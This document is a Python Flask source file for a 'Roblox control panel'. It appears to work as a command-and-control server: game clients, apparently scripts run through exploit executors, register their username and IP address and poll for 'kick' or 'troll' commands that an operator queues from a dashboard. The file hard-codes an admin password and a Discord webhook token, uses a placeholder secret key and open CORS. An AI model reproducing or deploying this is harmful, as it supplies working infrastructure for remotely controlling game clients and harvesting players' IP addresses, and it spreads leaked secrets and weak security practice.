from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
from flask_socketio import SocketIO
import time
import random
import requests

# ================= CONFIG =================
ADMIN_USER = "entrepreneur"
ADMIN_PASS = "E9#pX7@M2qL4"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1450877345513869374/doOUmy_SaDuv-0AxJsYd68cYsdICizKB-VB8SgJd2UyrJLjQxFw2qxTMztSxLKXHqpw7"

# ================= APP =================
app = Flask(__name__)
app.config["SECRET_KEY"] = "super-secret-key"
socketio = SocketIO(app, cors_allowed_origins="*")

connected_players = {}
pending_kicks = {}
pending_commands = {}

# ================= LOGIN / 2FA HTML =================
LOGIN_HTML = """
<!DOCTYPE html>
<html><body style="background:#000;color:#fff;font-family:Arial;text-align:center;margin-top:120px">
<h2>Admin Login</h2>
<form method="post">
<input name="username" placeholder="Username" required><br><br>
<input name="password" type="password" placeholder="Password" required><br><br>
<button type="submit">Login</button>
</form>
</body></html>
"""

TWOFA_HTML = """
<!DOCTYPE html>
<html><body style="background:#000;color:#fff;font-family:Arial;text-align:center;margin-top:120px">
<h2>2FA Verification</h2>
<form method="post">
<input name="code" placeholder="6-digit code" required><br><br>
<button type="submit">Verify</button>
</form>
</body></html>
"""

# ================= PANEL HTML =================
HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ROBLOX CONTROL PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:auto;padding:40px}
h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.8rem}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
.card:hover{transform:translateY(-8px)}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none}
.name a:hover{text-decoration:underline}
.info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:0.95rem;color:white;transition:transform .2s;margin-bottom:8px}
button.kick-btn:hover{transform:scale(1.05)}
button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
.cancel-btn{background:#444;color:white}
.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.6)}
.toast.danger{border-color:#ff3366}
</style>
</head>
<body>
<div class="container">
    <h1>ROBLOX CONTROL PANEL</h1>
    <div class="stats" id="stats"></div>
    <div class="grid" id="players"></div>
</div>

<!-- Kick Modal -->
<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelKick">Cancel</button>
            <button class="confirm-btn" id="confirmKick">Confirm</button>
        </div>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let firstRender = true;
let currentKickId = null;

const kickModal = document.getElementById("kickModal");

function toast(msg, type = "success") {
    const t = document.createElement("div");
    t.className = "toast " + (type === "danger" ? "danger" : "");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }

function closeModal(m) { m.classList.remove("active"); }

function performKick() {
    if (!currentKickId) return;
    const reason = document.getElementById("kickReason").value.trim() || "No reason";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
    toast(`Kick sent`, "danger");
    closeModal(kickModal);
}

function sendTroll(id, cmd) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
    toast(`${cmd.toUpperCase()} sent`, "danger");
}

function render(data) {
    const grid = document.getElementById("players");
    const stats = document.getElementById("stats");
    stats.innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
}
socket.on("update", render);
</script>
</body>
</html>
"""

# ================= ROUTES =================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form["username"] == ADMIN_USER and request.form["password"] == ADMIN_PASS:
            code = str(random.randint(100000, 999999))
            session["2fa_code"] = code
            session["username"] = ADMIN_USER
            requests.post(DISCORD_WEBHOOK, json={"content": f"🔐 2FA CODE pour {ADMIN_USER}: {code}"})
            return redirect(url_for("twofa"))
    return LOGIN_HTML

@app.route("/twofa", methods=["GET", "POST"])
def twofa():
    if "2fa_code" not in session:
        return redirect("/login")
    if request.method == "POST":
        if request.form.get("code") == session["2fa_code"]:
            session["auth"] = True
            session.pop("2fa_code")
            return redirect("/")
    return TWOFA_HTML

@app.route("/")
def index():
    if not session.get("auth"):
        return redirect("/login")
    return render_template_string(HTML)

# ================= API / KICK / TROLL =================
@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json()
        uid = int(d["userid"])
        if d["action"] == "register":
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "executor": d.get("executor", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "last": now
            }
        elif d["action"] == "heartbeat":
            connected_players[uid]["last"] = now

    if request.method == "GET":
        uid = int(request.args.get("userid", 0))
        if uid in pending_kicks:
            return jsonify({"command": "kick", "reason": pending_kicks.pop(uid)})
        if uid in pending_commands:
            cmd_data = pending_commands.pop(uid)
            return jsonify({"command": cmd_data["cmd"], **cmd_data.get("args", {})})
    return jsonify({"ok": True})

@app.route("/kick", methods=["POST"])
def kick():
    d = request.get_json()
    uid = int(d["userid"])
    reason = d.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    d = request.get_json()
    uid = int(d["userid"])
    cmd = d["cmd"]
    pending_commands[uid] = {"cmd": cmd, "args": {}}
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": f"{cmd.upper()} sent"})
    return jsonify({"sent": True})

# ================= BROADCAST =================
def broadcast():
    while True:
        now = time.time()
        online = 0
        to_delete = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_delete.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_delete: del connected_players[uid]

        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

# ================= START =================
if __name__ == "__main__":
    print(f"Server started → http://127.0.0.1:5000")
    print(f"Login: {ADMIN_USER}, Password: {ADMIN_PASS}")
    socketio.start_background_task(broadcast)
    socketio.run(app, host="0.0.0.0", port=5000)
